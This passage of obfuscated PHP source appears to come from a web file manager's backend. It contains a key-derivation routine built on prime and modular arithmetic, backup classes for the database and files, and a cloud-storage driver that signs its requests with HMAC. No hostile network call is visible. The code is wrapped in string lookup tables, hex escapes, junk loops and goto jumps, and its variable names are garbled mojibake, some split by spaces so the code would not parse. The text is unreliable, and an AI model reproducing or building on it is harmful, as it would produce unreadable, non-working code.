$Âê¨Õ¦Á = $this->vocr0aaa5376($¦—Ñìøü * $¤±Ò¦…Œ . $šáè“ [6], $šáè“ [136]); $¾Ï²ªµË = md5($šáè“ [304] . ($¦—Ñìøü + $¤±Ò¦…Œ) . $šáè“ [305] . $À®Ä£Í . $šáè“ [305] . $òØ¶î¤ó . $šáè“ [306]); $Îó®šàÎ = $this->vocr0aaa5376($Ş«Î•ú´, $¾Ï²ªµË) . $šáè“ [307] . $Âê¨Õ¦Á; $Ò—“ÂÎº = $ÄÂ‘“ëÃ[785]; while (strlen($Ò—“ÂÎº) < $ÄÂ‘“ëÃ[687]) { if (!$Ò—“ÂÎº) { break; } $Ò—“ÂÎº++; } return $Îó®šàÎ; } public function wncv38298012($·®À«ñÊ) { $•œğé‚ƒ =& $_SERVER[è¶³ÒßÑ]; $Œ ÙÓÊä =& $_SERVER[çÛ›³ª²]; $™ºÏ°±ë = explode($Œ ÙÓÊä[307], $·®À«ñÊ); $¤é‰ñ = $•œğé‚ƒ[786]; if (count($™ºÏ°±ë) != 2) { return $Œ ÙÓÊä[6]; } $†ÅÆø–ì = $this->nzotc32e1cd2($™ºÏ°±ë[1] . $Œ ÙÓÊä[6], $Œ ÙÓÊä[136]); $¶±»‘ØÊ = $•œğé‚ƒ[787]; if (!$¶±»‘ØÊ) { return; } if (!$†ÅÆø–ì) { return $Œ ÙÓÊä[6]; } $†ÅÆø–ì = intval($†ÅÆø–ì); $—Õ·û— = 0; $âîÙŸçŒ = $•œğé‚ƒ[767]; while ($âîÙŸçŒ < $•œğé‚ƒ[61]) { if ($âîÙŸçŒ >= 0) { break; } $âîÙŸçŒ++; } $£Í×Æ†‡ = 0; for ($»¥Á«À‘ = 3; $»¥Á«À‘ < $†ÅÆø–ì; $»¥Á«À‘ += 2) { if ($†ÅÆø–ì % $»¥Á«À‘ != 0) { continue; } $—Õ·û— = $»¥Á«À‘; $ëĞĞÀ– = $•œğé‚ƒ[788]; $£Í×Æ†‡ = intval($†ÅÆø–ì / $»¥Á«À‘); $•š¶¬‡ = $•œğé‚ƒ[789]; break; $ã‹¸öÔª = $•œğé‚ƒ[790]; if (!$ã‹¸öÔª) { die; } } $Ú³ûâ¦„ = ($—Õ·û— - 1) * ($£Í×Æ†‡ - 1); $–½’¹ = intval(($—Õ·û— + $£Í×Æ†‡) / 2); while (1) { $Ì‰™ÏßÈ = $–½’¹; $‚³‹Ãºó = $•œğé‚ƒ[791]; while ($‚³‹Ãºó < $•œğé‚ƒ[697]) { if ($‚³‹Ãºó >= 0) { break; } $‚³‹Ãºó++; } $ÃèØÍ™‡ = $Ú³ûâ¦„; while ($ÃèØÍ™‡ % $Ì‰™ÏßÈ != 0) { $“ÒÄŠÃ… = $ÃèØÍ™‡; $ÃèØÍ™‡ = $Ì‰™ÏßÈ; $—š‘ØÀş = $•œğé‚ƒ[792]; while (strlen($—š‘ØÀş) < $•œğé‚ƒ[677]) { if (!$—š‘ØÀş) { break; } $—š‘ØÀş++; } $Ì‰™ÏßÈ = $“ÒÄŠÃ… % $Ì‰™ÏßÈ; $Ñèñæ…Ş = $•œğé‚ƒ[793]; } if ($Ì‰™ÏßÈ == 1) { break; } else { $–½’¹++; } } $ıŠµß = 2; $æìÚ¬Üå = $•œğé‚ƒ[794]; if (!$æìÚ¬Üå) { die; } for ($»¥Á«À‘ = 0; $»¥Á«À‘ < $Ú³ûâ¦„ * 10; $»¥Á«À‘++) { if (($Ú³ûâ¦„ * $»¥Á«À‘ + 1) % $–½’¹ == 0) { $ıŠµß = intval(($Ú³ûâ¦„ * $»¥Á«À‘ + 1) / $–½’¹); break; } } $¤·¢ğî = md5($Œ ÙÓÊä[304] . ($—Õ·û— + $£Í×Æ†‡) . $Œ ÙÓÊä[305] . $–½’¹ . $Œ ÙÓÊä[305] . $ıŠµß . $Œ ÙÓÊä[306]); $ß¤œ”²— = $•œğé‚ƒ[795]; $äğ‰Ö„¦ = $this->nzotc32e1cd2($™ºÏ°±ë[0], $¤·¢ğî); $ıŞÉ¤’ = $•œğé‚ƒ[796]; if (!$ıŞÉ¤’) { die; } return $äğ‰Ö„¦; } public function jqpr814ec593() { $âÂÍ°ÂÛ =& $_SERVER[è¶³ÒßÑ]; $üÀÇç±î = mt_rand(pow(2, 14), pow(2, 16) - 1); $’ò§âòÜ = array(); $ƒœÕÛåç = $âÂÍ°ÂÛ[797]; $¼‹„ËÙ = 1; while ($¼‹„ËÙ <= (int) sqrt($üÀÇç±î)) { $˜É¡ˆë‹ = $¼‹„ËÙ; while (!0) { $˜É¡ˆë‹++; if ($˜É¡ˆë‹ <= 2) { $¼‹„ËÙ = $˜É¡ˆë‹; break; } else { if ($˜É¡ˆë‹ < 2) { continue; } } $°ÒŠè»¬ = !0; for ($¾“†ğÑÙ = 2; $¾“†ğÑÙ <= sqrt($˜É¡ˆë‹); $¾“†ğÑÙ++) { if ($˜É¡ˆë‹ % $¾“†ğÑÙ == 0) { $°ÒŠè»¬ = !1; } } if ($°ÒŠè»¬) { $¼‹„ËÙ = $˜É¡ˆë‹; break; } } $’ò§âòÜ[] = $¼‹„ËÙ; $µ§ ²‚È = $âÂÍ°ÂÛ[798]; while ($µ§ ²‚È < $âÂÍ°ÂÛ[61]) { if ($µ§ ²‚È >= 0) { break; } $µ§ ²‚È++; } } $óÔğó«ƒ = 2; for ($˜É¡ˆë‹ = $üÀÇç±î; $˜É¡ˆë‹ > 1; $˜É¡ˆë‹--) { $°ÒŠè»¬ = !0; $‰°„öÂ¦ = $âÂÍ°ÂÛ[799]; if (strlen($‰°„öÂ¦) < $âÂÍ°ÂÛ[697]) { die; } foreach ($’ò§âòÜ as $³‹¾±‹€) { if ($˜É¡ˆë‹ % $³‹¾±‹€ == 0) { $°ÒŠè»¬ = !1; break; } } if ($°ÒŠè»¬) { $óÔğó«ƒ = $˜É¡ˆë‹; break; } } return $óÔğó«ƒ; $›Ñ‘ô¡ş = $âÂÍ°ÂÛ[800]; } public function pocm4ee1859b($´´åÓù’, $óûªêĞ…) { $áœïïü =& $_SERVER[è¶³ÒßÑ]; $ÌÍùÊÉè =& $_SERVER[çÛ›³ª²]; return call_user_func(array($ÌÍùÊÉè[8], $ÌÍùÊÉè[308]), $´´åÓù’, $óûªêĞ…); $»ë¸¹Ñ = $áœïïü[801]; while ($»ë¸¹Ñ < $áœïïü[697]) { if ($»ë¸¹Ñ >= 0) { break; } $»ë¸¹Ñ++; } } public function vocr0aaa5376($Ô¤óÕ®ˆ, $¨œÒ³ò) { $ç‘°¡é =& $_SERVER[çÛ›³ª²]; return call_user_func(array($ç‘°¡é[309], $ç‘°¡é[310]), $Ô¤óÕ®ˆ, $¨œÒ³ò); } public function nzotc32e1cd2($™”ùï–Ü, $ÅÁÚªº) { $ÂÚî¢ñ =& $_SERVER[çÛ›³ª²]; return call_user_func(array($ÂÚî¢ñ[309], $ÂÚî¢ñ[311]), $™”ùï–Ü, $ÅÁÚªº); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[è¶³ÒßÑ][802]); $this->init(); $this->keep(); } public function init() { $Œ…«õÕÛ =& $_SERVER[è¶³ÒßÑ]; $this->isManual(); self::$name = date($Œ…«õÕÛ[803]); if (!($…õÜ¶ÆÕ = $this->model->lastItem())) { $…õÜ¶ÆÕ = $this->initData(); } else { self::$name = $…õÜ¶ÆÕ[$Œ…«õÕÛ[32]]; if ($…õÜ¶ÆÕ[$Œ…«õÕÛ[804]] == $Œ…«õÕÛ[101]) { self::$name = date($Œ…«õÕÛ[281]); $Íë‘ıÛ = intval(_get($…õÜ¶ÆÕ, $Œ…«õÕÛ[805], 0)); if (self::$manual == 0 && $…õÜ¶ÆÕ[$Œ…«õÕÛ[32]] == self::$name) { $this->model->remove($…õÜ¶ÆÕ[$Œ…«õÕÛ[468]]); } $…õÜ¶ÆÕ = $this->initData($Íë‘ıÛ, $…õÜ¶ÆÕ[$Œ…«õÕÛ[806]]); } else { $this->checkStore($…õÜ¶ÆÕ[$Œ…«õÕÛ[806]]); } } self::$option = $…õÜ¶ÆÕ; } private function isManual() { $ÔÜËÛä‚ = _get($GLOBALS, $_SERVER[è¶³ÒßÑ][807], 0); $ÔÜËÛä‚ = intval($ÔÜËÛä‚); self::$manual = $ÔÜËÛä‚ && $ÔÜËÛä‚ == 1 ? 1 : 0; } private function initData($™–˜éãç = 0, $¶ø®™æœ = '') { $Ôôº×‹ù =& $_SERVER[è¶³ÒßÑ]; $Ğê¾Şâ = $this->model->config(); if ($¶ø®™æœ && $Ğê¾Şâ[$Ôôº×‹ù[806]] != $¶ø®™æœ) { $™–˜éãç = 0; } $this->checkStore($Ğê¾Şâ[$Ôôº×‹ù[806]]); if (self::$manual == 1) { self::$name .= $Ôôº×‹ù[11] . date($Ôôº×‹ù[808]); } $÷›÷Íü = array($Ôôº×‹ù[806] => $Ğê¾Şâ[$Ôôº×‹ù[806]], $Ôôº×‹ù[32] => self::$name, $Ôôº×‹ù[804] => 0, $Ôôº×‹ù[181] => $Ğê¾Şâ[$Ôôº×‹ù[181]], $Ôôº×‹ù[809] => self::$manual, $Ôôº×‹ù[362] => array($Ôôº×‹ù[810] => array($Ôôº×‹ù[804] => 0), $Ôôº×‹ù[811] => array($Ôôº×‹ù[804] => 0, $Ôôº×‹ù[812] => 0, $Ôôº×‹ù[813] => 0, $Ôôº×‹ù[33] => $Ôôº×‹ù[12], $Ôôº×‹ù[814] => 0, $Ôôº×‹ù[815] => 0), $Ôôº×‹ù[816] => array($Ôôº×‹ù[804] => 0, $Ôôº×‹ù[812] => 0, $Ôôº×‹ù[813] => 0, $Ôôº×‹ù[814] => 0, $Ôôº×‹ù[815] => 0), $Ôôº×‹ù[240] => array($Ôôº×‹ù[804] => 0, $Ôôº×‹ù[817] => 0, $Ôôº×‹ù[818] => 0, $Ôôº×‹ù[819] => 0, $Ôôº×‹ù[820] => 0, $Ôôº×‹ù[534] => $™–˜éãç, $Ôôº×‹ù[814] => 0, $Ôôº×‹ù[815] => 0)), $Ôôº×‹ù[814] => time(), $Ôôº×‹ù[815] => 0); $óöİú´ê = $this->model->insert($÷›÷Íü); $÷›÷Íü[$Ôôº×‹ù[468]] = $óöİú´ê; return $÷›÷Íü; } private function checkStore($Û†Ê‰¶) { $ùŞ£ = Model($_SERVER[è¶³ÒßÑ][821]); $›Ø‡¯î­ = $ùŞ£->listData($Û†Ê‰¶); $ùŞ£->checkConfig($›Ø‡¯î­); } public static function get() { if (!self::$option) { $Æ” Àš = Model($_SERVER[è¶³ÒßÑ][802]); $…Âœâ†á = $Æ” Àš->findByName(self::$name); $Æ” Àš->parseContent($…Âœâ†á); self::$option = $…Âœâ†á; } return self::$option; } public static function set($À’”É×ë) { $€æ—Ù“´ =& $_SERVER[è¶³ÒßÑ]; $Æ •Ù™ = self::get(); foreach ($À’”É×ë as $Ö‡ÊŒùı => $ç¯·•š–) { array_set_value($Æ •Ù™, $Ö‡ÊŒùı, $ç¯·•š–); } Model($€æ—Ù“´[802])->update($Æ •Ù™[$€æ—Ù“´[468]], $Æ •Ù™); self::$option = $Æ •Ù™; return self::$option; } public function keep() { $óæê®†Ä =& $_SERVER[è¶³ÒßÑ]; $»àÕ¸¦æ = self::get(); if (_get($»àÕ¸¦æ, $óæê®†Ä[822], 0) == $óæê®†Ä[101]) { return; } $this->backupKeep($»àÕ¸¦æ); self::set(array($óæê®†Ä[822] => 1)); } private function backupKeep($ø¥ äı) { $‚şØÇË =& $_SERVER[è¶³ÒßÑ]; if (self::$manual == 1) { return; } $ú–¨éË = $this->model->listData(); if (empty($ú–¨éË)) { return; } $˜ÅİÊæÈ = 0; $Èûßà•» = array(); foreach ($ú–¨éË as $Ê›òßâÊ) { if ($˜ÅİÊæÈ >= 7) { break; } $Èûßà•»[] = $Ê›òßâÊ[$‚şØÇË[32]]; $˜ÅİÊæÈ++; } for ($˜ÅİÊæÈ = 0; $˜ÅİÊæÈ < 12; $˜ÅİÊæÈ++) { $Èûßà•»[] = date($‚şØÇË[823], strtotime("\55{$˜ÅİÊæÈ}\x20\155\157\x6e\x74\150\163")); } $Èûßà•» = array_unique($Èûßà•»); $â­€İ‚— = Model($‚şØÇË[824])->get($‚şØÇË[825]); foreach ($ú–¨éË as $Ê›òßâÊ) { if (isset($Ê›òßâÊ[$‚şØÇË[809]]) && $Ê›òßâÊ[$‚şØÇË[809]] == $‚şØÇË[101]) { continue; } if (!empty($Ê›òßâÊ[$‚şØÇË[32]]) && in_array($Ê›òßâÊ[$‚şØÇË[32]], $Èûßà•»)) { continue; } $this->model->remove($Ê›òßâÊ[$‚şØÇË[468]]); $ßÈã¶«ö = $this->backupPath($ø¥ äı, $â­€İ‚—); IO::remove($ßÈã¶«ö, !1); } } private function backupPath($âŞÆ«Ñè, $ †ù·Ş = false) { $Ï²­é§ =& $_SERVER[è¶³ÒßÑ]; if (!$ †ù·Ş) { $ †ù·Ş = Model($Ï²­é§[824])->get($Ï²­é§[825]); } $¸¶É²¢ = $âŞÆ«Ñè[$Ï²­é§[32]]; $´ş¢Œ = substr(md5($Ï²­é§[826] . $ †ù·Ş . $¸¶É²¢), 0, 8); return "\173\151\x6f\72{$âŞÆ«Ñè[$Ï²­é§[806]]}\175\x2f\144\x61\x74\x61\142\x61\x73\145\x2f\x62\141\x63\153\x75\160\57" . $¸¶É²¢ . $Ï²­é§[11] . $´ş¢Œ; } public function db() { $îºĞÈ® =& $_SERVER[è¶³ÒßÑ]; $¾´‚‘­ = self::get(); if (_get($¾´‚‘­, $îºĞÈ®[827], 0) == $îºĞÈ®[101]) { return !0; } $ÖÃêñµĞ = new BackupDb(); if (!$ÖÃêñµĞ->index()) { return !1; } self::set(array($îºĞÈ®[827] => 1)); return !0; } public function dbFile() { $åª³Åƒ‰ =& $_SERVER[è¶³ÒßÑ]; $ÕÀ…•©Ó = self::get(); if (_get($ÕÀ…•©Ó, $åª³Åƒ‰[828], 0) == $åª³Åƒ‰[101]) { return !0; } $ÖÓ˜ò”€ = new BackupDbFile(); if (!$ÖÓ˜ò”€->index()) { return !1; } self::set(array($åª³Åƒ‰[828] => 1)); return !0; } public function file() { $Ÿ¨¬ş¡Ÿ =& $_SERVER[è¶³ÒßÑ]; $Ë‚‡€Úî = self::get(); if (_get($Ë‚‡€Úî, $Ÿ¨¬ş¡Ÿ[829], 0) == $Ÿ¨¬ş¡Ÿ[101]) { return !0; } if ($Ë‚‡€Úî[$Ÿ¨¬ş¡Ÿ[181]] == $Ÿ¨¬ş¡Ÿ[830]) { $…î§ª°Ö = new BackupFile(); if (!$…î§ª°Ö->index()) { return !1; } } self::set(array($Ÿ¨¬ş¡Ÿ[829] => 1, $Ÿ¨¬ş¡Ÿ[804] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $úĞİÖäÚ =& $_SERVER[è¶³ÒßÑ]; $Å’¦ÇıÂ = Backup::get(); self::$io = $Å’¦ÇıÂ[$úĞİÖäÚ[806]]; self::$name = $Å’¦ÇıÂ[$úĞİÖäÚ[32]]; $èìßº„ = new DbManage(); $£İä¶ = $èìßº„->dbType(); $³Ë½¨µ = array($úĞİÖäÚ[831] => $£İä¶, $úĞİÖäÚ[832] => time()); Backup::set($³Ë½¨µ); $û·Æéˆ = $this->tmpFilesPath() . $úĞİÖäÚ[833] . self::$name . $úĞİÖäÚ[8]; del_dir($û·Æéˆ); mk_dir($û·Æéˆ); $ÌÃæø­ = $ìŒÕõÒÂ = 0; try { $Ö¨ƒ‚¤¢ = $èìßº„->db()->getTables(); } catch (Exception $°¡èŠİí) { return !1; } $Ö¨ƒ‚¤¢ = array_diff($Ö¨ƒ‚¤¢, array($úĞİÖäÚ[834], $úĞİÖäÚ[835])); foreach ($Ö¨ƒ‚¤¢ as $´…Æöæ‰) { $ÌÃæø­ += $èìßº„->model($´…Æöæ‰)->count(); } $ëòôÃˆ£ = new Task($úĞİÖäÚ[836], $úĞİÖäÚ[837], $ÌÃæø­, LNG($úĞİÖäÚ[838]) . $úĞİÖäÚ[839] . LNG($úĞİÖäÚ[840])); $GLOBALS[$úĞİÖäÚ[841]] = self::$name; foreach ($Ö¨ƒ‚¤¢ as $´…Æöæ‰) { $›ñ…¯Å› = $û·Æéˆ . $´…Æöæ‰ . $úĞİÖäÚ[842]; $›¦—±ô² = null; if ($´…Æöæ‰ == $úĞİÖäÚ[843] && (!isset($Å’¦ÇıÂ[$úĞİÖäÚ[181]]) || $Å’¦ÇıÂ[$úĞİÖäÚ[181]] == $úĞİÖäÚ[238])) { $›¦—±ô² = self::$io; } $ìŒÕõÒÂ += $èìßº„->sqlFromDb($´…Æöæ‰, $›ñ…¯Å›, $ëòôÃˆ£, $›¦—±ô²); } unset($GLOBALS[$úĞİÖäÚ[841]]); $ëòôÃˆ£->end(); if ($ìŒÕõÒÂ > $ÌÃæø­) { $ÌÃæø­ = $ìŒÕõÒÂ; } $³Ë½¨µ = array($úĞİÖäÚ[831] => $£İä¶, $úĞİÖäÚ[827] => 1, $úĞİÖäÚ[844] => $ÌÃæø­, $úĞİÖäÚ[845] => $ìŒÕõÒÂ, $úĞİÖäÚ[846] => time()); Backup::set($³Ë½¨µ); if ($ÌÃæø­ - $ìŒÕõÒÂ > 0) { $ğ¬ï”Ø² = $úĞİÖäÚ[847]; if (!stristr(I18n::getType(), $úĞİÖäÚ[848])) { $ğ¬ï”Ø² = $úĞİÖäÚ[849]; } write_log(array($ğ¬ï”Ø², $³Ë½¨µ), $úĞİÖäÚ[837]); return !1; } return !0; } private function tmpFilesPath() { $ìûÕ¯¬¯ =& $_SERVER[è¶³ÒßÑ]; $ÊÇÔ¬¼ü = TEMP_FILES; if ($GLOBALS[$ìûÕ¯¬¯[6]][$ìûÕ¯¬¯[102]][$ìûÕ¯¬¯[850]]) { $ÊÇÔ¬¼ü = $GLOBALS[$ìûÕ¯¬¯[6]][$ìûÕ¯¬¯[102]][$ìûÕ¯¬¯[850]]; if (!mk_dir($ÊÇÔ¬¼ü) || !is_writable($ÊÇÔ¬¼ü) || !IO::mkfile($ÊÇÔ¬¼ü . $ìûÕ¯¬¯[851])) { $ÊÇÔ¬¼ü = TEMP_FILES; } } return $ÊÇÔ¬¼ü; } } goto AÕ˜µŠŒ Ú; b•Õ×÷¤·Ù: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($¨ô»¹§·, $´Ö¼ØÙÛ = 0) { parent::__construct(); $this->source = $¨ô»¹§·; $this->sourceSize = $´Ö¼ØÙÛ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($å‚—†Ô² = false) { return $this->sourceSize; } public function getContent($£«¢Ùùº = false) { return $this->fileSubstr($£«¢Ùùº, 0, $this->sourceSize); } public function fileSubstr($‚ø¸ºåÕ = false, $›ŒÊã¦ = 0, $¹÷ó‹ûë = 0) { if (!$¹÷ó‹ûë) { $¹÷ó‹ûë = $this->sourceSize; } $Ó‹ó•µ = $this->sourceSize - $›ŒÊã¦; if ($¹÷ó‹ûë >= $Ó‹ó•µ) { $¹÷ó‹ûë = $Ó‹ó•µ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $›ŒÊã¦, $¹÷ó‹ûë); } if ($this->sourceType == self::TYPE_FILE) { if ($¹÷ó‹ûë <= 0) { return $_SERVER[è¶³ÒßÑ][12]; } $°—ÙóÓ€ = ftell($this->source); fseek_64($this->source, $°—ÙóÓ€ + $›ŒÊã¦); $ì¯«ŞÉ¶ = @fread($this->source, $¹÷ó‹ûë); fseek_64($this->source, $°—ÙóÓ€); return $ì¯«ŞÉ¶; } } public function hashMd5($ğê®üãú = false) { return md5($this->getContent()); } public static function hash($Ş½·ß•‡, $İü§şÒ = 0) { $Î¨²Ä¦† = new PathDriverStream($Ş½·ß•‡, $İü§şÒ); return $Î¨²Ä¦†->hashSimple($Ş½·ß•‡); } public static function md5($ºÍîÒı½, $ÓÕÎÕÉ± = 0) { $±Òç˜á = new PathDriverStream($ºÍîÒı½, $ÓÕÎÕÉ±); return $±Òç˜á->hashMd5($ºÍîÒı½); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\160\72\x2f\57\166\x30\56\141\160\x69\56\165\x70\171\165\156\x2e\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Ø²ºŞˆÂ) { parent::__construct(); $this->_init($Ø²ºŞˆÂ); } public function _init($¹ú„§Œ’) { $ÀŒöüì =& $_SERVER[è¶³ÒßÑ]; foreach ($¹ú„§Œ’ as $‡¦áåïï => $¶õÜĞƒë) { if (isset($this->{$‡¦áåïï})) { $this->{$‡¦áåïï} = $¶õÜĞƒë; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ÀŒöüì[1534] . LNG($ÀŒöüì[1440])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($°€•²ÁŸ, $“€åşœ = "\x47\105\124") { $èà³«Ã© =& $_SERVER[è¶³ÒßÑ]; $æş«íèÆ = gmdate($èà³«Ã©[1471]); $«ıÁ€ÚÛ = base64_encode(hash_hmac($èà³«Ã©[1535], "{$“€åşœ}\x26{$°€•²ÁŸ}\x26{$æş«íèÆ}", md5("{$this->userpass}"), !0)); $Æ¦åÄú = array("\x41\165\x74\x68\157\x72\x69\172\x61\164\x69\157\156\72\125\120\131\125\116\40{$this->username}\x3a{$«ıÁ€ÚÛ}", "\104\141\x74\145\72{$æş«íèÆ}"); return $Æ¦åÄú; } public function ussRequest($ƒ˜Åú˜Ì, $şÇ¢·æÇ = "\x47\x45\124", $¿”¦®’ = false, $ÃØµÈğ« = false, $Ö—û®Ñ‘ = false) { $ƒŸÄÈ°¾ =& $_SERVER[è¶³ÒßÑ]; $ƒ˜Åú˜Ì = trim($ƒ˜Åú˜Ì, $ƒŸÄÈ°¾[8]); $Şù¸©Œ› = "\x2f{$this->bucket}\x2f{$ƒ˜Åú˜Ì}"; $Æî¯ÍŸ© = $this->ussHeaders($Şù¸©Œ›, $şÇ¢·æÇ); if ($ÃØµÈğ«) { $Æî¯ÍŸ© = array_merge($Æî¯ÍŸ©, $ÃØµÈğ«); } $¤ºñÓ°Ğ = url_request($this->endpoint . $Şù¸©Œ›, $şÇ¢·æÇ, $¿”¦®’, $Æî¯ÍŸ©, $Ö—û®Ñ‘); if (!$¤ºñÓ°Ğ) { $®øı‹ª = LNG($ƒŸÄÈ°¾[1536]); $this->writeLog($®øı‹ª); return array($ƒŸÄÈ°¾[1272] => !1, $ƒŸÄÈ°¾[1262] => $®øı‹ª); } if (strtolower($şÇ¢·æÇ) == $ƒŸÄÈ°¾[237] || in_array($¤ºñÓ°Ğ[$ƒŸÄÈ°¾[1272]], array($ƒŸÄÈ°¾[283], $ƒŸÄÈ°¾[1537]))) { $¿”¦®’ = $¤ºñÓ°Ğ[$ƒŸÄÈ°¾[1538]]; } else { $¿”¦®’ = json_decode($¤ºñÓ°Ğ[$ƒŸÄÈ°¾[1262]], !0); if (!$¿”¦®’) { $¿”¦®’ = $¤ºñÓ°Ğ[$ƒŸÄÈ°¾[1262]]; } else { if (!$¤ºñÓ°Ğ[$ƒŸÄÈ°¾[804]] && isset($¿”¦®’[$ƒŸÄÈ°¾[1539]])) { $¿”¦®’ = $¿”¦®’[$ƒŸÄÈ°¾[1539]]; } } } if (!$¤ºñÓ°Ğ[$ƒŸÄÈ°¾[804]]) { $this->writeLog($this->__errorMessage($¿”¦®’)); } return array($ƒŸÄÈ°¾[1272] => $¤ºñÓ°Ğ[$ƒŸÄÈ°¾[804]], $ƒŸÄÈ°¾[1262] => $¿”¦®’); } private function __errorMessage($‡­ÜÀ…’) { $ş­ê†‚Š =& $_SERVER[è¶³ÒßÑ]; if (!$‡­ÜÀ…’) { return $ş­ê†‚Š[12]; } static $Í‹å÷• = null; if (!$Í‹å÷•) { $Í‹å÷• = I18n::getType(); } if ($Í‹å÷• != $ş­ê†‚Š[1481]) { return $‡­ÜÀ…’; } $¨ÊÊ°” = array($ş­ê†‚Š[1540] => $ş­ê†‚Š[1541], $ş­ê†‚Š[1542] => $ş­ê†‚Š[1543], $ş­ê†‚Š[1544] => $ş­ê†‚Š[1543], $ş­ê†‚Š[1545] => $ş­ê†‚Š[1546], $ş­ê†‚Š[1547] => $ş­ê†‚Š[1548], $ş­ê†‚Š[1549] => $ş­ê†‚Š[1550], $ş­ê†‚Š[1551] => $ş­ê†‚Š[1552]); return isset($¨ÊÊ°”[$‡­ÜÀ…’]) ? $¨ÊÊ°”[$‡­ÜÀ…’] : $‡­ÜÀ…’; } public function mkfile($ê­¿Ø, $”®£ô™Æ = '', $ÍİíÃê = REPEAT_RENAME) { if ($this->setContent($ê­¿Ø, $”®£ô™Æ)) { return $this->getPathOuter($ê­¿Ø); } return !1; } public function mkdir($ÈÓ‰±˜, $ÔúÆËìÇ = REPEAT_SKIP) { $ËÁûÙı =& $_SERVER[è¶³ÒßÑ]; $×îşªÉì = trim($ÈÓ‰±˜, $ËÁûÙı[8]); if ($this->_isFolder($×îşªÉì)) { return $this->getPathOuter($×îşªÉì); } $ôòÕ±‡‘ = array($ËÁûÙı[1553]); $ãøĞğ¬± = $this->ussRequest($×îşªÉì, $ËÁûÙı[267], !1, $ôòÕ±‡‘); return $ãøĞğ¬±[$ËÁûÙı[1272]] ? $this->getPathOuter($×îşªÉì) : !1; } public function copyFile($·ûæ•åØ, $–º›¼ğá) { $ş•Í†‚´ =& $_SERVER[è¶³ÒßÑ]; $µıÛ¿á° = array($ş•Í†‚´[1554] . "\x2f{$this->bucket}\x2f{$·ûæ•åØ}", $ş•Í†‚´[1555]); $ÃÓ¸ÕâÖ = $this->ussRequest($–º›¼ğá, $ş•Í†‚´[269], !1, $µıÛ¿á°); return $ÃÓ¸ÕâÖ[$ş•Í†‚´[1272]] ? !0 : $this->getPathOuter($–º›¼ğá); } public function moveFile($Îüæœëô, $‘õ©’ì ) { $İÕ…Ÿù® =& $_SERVER[è¶³ÒßÑ]; $ğú£şÄ« = array($İÕ…Ÿù®[1556] . "\x2f{$this->bucket}\57{$Îüæœëô}", $İÕ…Ÿù®[1555]); $œ¿®ˆ›§ = $this->ussRequest($‘õ©’ì , $İÕ…Ÿù®[269], !1, $ğú£şÄ«); return $œ¿®ˆ›§[$İÕ…Ÿù®[1272]] ? !0 : $this->getPathOuter($‘õ©’ì ); } public function delFile($”¦Ôõ¢İ) { $ãÄ¶¨ßğ =& $_SERVER[è¶³ÒßÑ]; $ğ˜¦Ì¯ğ = $this->ussRequest($”¦Ôõ¢İ, $ãÄ¶¨ßğ[1557]); return $ğ˜¦Ì¯ğ[$ãÄ¶¨ßğ[1272]] ? !0 : !1; } public function delFolder($æö¤×ìŞ) { $­¸›’ÇÊ =& $_SERVER[è¶³ÒßÑ]; if (!$this->exist($æö¤×ìŞ)) { return !0; } $this->listItemCache = !1; $‘şŠ¼Áğ = $ñáÔêê¼ = array(); $this->fileList($æö¤×ìŞ, $‘şŠ¼Áğ, $ñáÔêê¼, !0); $this->listItemCache = !0; foreach ($ñáÔêê¼ as $†½‡ı·å) { $à÷Â¨ş = $this->ussRequest($†½‡ı·å[$­¸›’ÇÊ[32]], $­¸›’ÇÊ[1557]); if (!$à÷Â¨ş[$­¸›’ÇÊ[1272]]) { return !1; } } foreach ($‘şŠ¼Áğ as $Û‰˜Ò¦Â) { $à÷Â¨ş = $this->ussRequest($Û‰˜Ò¦Â, $­¸›’ÇÊ[1557]); if (!$à÷Â¨ş[$­¸›’ÇÊ[1272]]) { return !1; } } $à÷Â¨ş = $this->ussRequest($æö¤×ìŞ, $­¸›’ÇÊ[1557]); return $à÷Â¨ş[$­¸›’ÇÊ[1272]]; } public function rename($Şğ¸™©Œ, $óı¢¤¾é) { if ($this->isFile($Şğ¸™©Œ)) { $óı¢¤¾é = get_path_father($Şğ¸™©Œ) . $óı¢¤¾é; return $this->moveFile($Şğ¸™©Œ, $óı¢¤¾é); } return $this->renameObject($Şğ¸™©Œ, $óı¢¤¾é); } public function fileInfo($Öô¾‹­, $¯¸°¡ïù = false, $•ñ´£­ƒ = array()) { $»˜¢Û’¡ =& $_SERVER[è¶³ÒßÑ]; $’ìï¹€é = array($»˜¢Û’¡[32] => $this->pathThis($Öô¾‹­), $»˜¢Û’¡[97] => $this->getPathOuter($»˜¢Û’¡[8] . $Öô¾‹­), $»˜¢Û’¡[33] => $»˜¢Û’¡[240], $»˜¢Û’¡[89] => isset($•ñ´£­ƒ[$»˜¢Û’¡[89]]) ? $•ñ´£­ƒ[$»˜¢Û’¡[89]] : 0, $»˜¢Û’¡[179] => $this->ext($Öô¾‹­)); if ($¯¸°¡ïù) { return $’ìï¹€é; } $’ìï¹€é[$»˜¢Û’¡[241]] = $’ìï¹€é[$»˜¢Û’¡[98]] = 0; $’ìï¹€é[$»˜¢Û’¡[242]] = $’ìï¹€é[$»˜¢Û’¡[243]] = !0; if (empty($•ñ´£­ƒ)) { $•ñ´£­ƒ = $this->objectMeta($Öô¾‹­); if (!$•ñ´£­ƒ) { return $’ìï¹€é; } } $’ìï¹€é[$»˜¢Û’¡[241]] = intval($•ñ´£­ƒ[$»˜¢Û’¡[1558]]); $’ìï¹€é[$»˜¢Û’¡[98]] = intval($•ñ´£­ƒ[$»˜¢Û’¡[1559]]); $’ìï¹€é[$»˜¢Û’¡[89]] = $•ñ´£­ƒ[$»˜¢Û’¡[89]]; return $’ìï¹€é; } public function folderInfo($Ï¦É»È­, 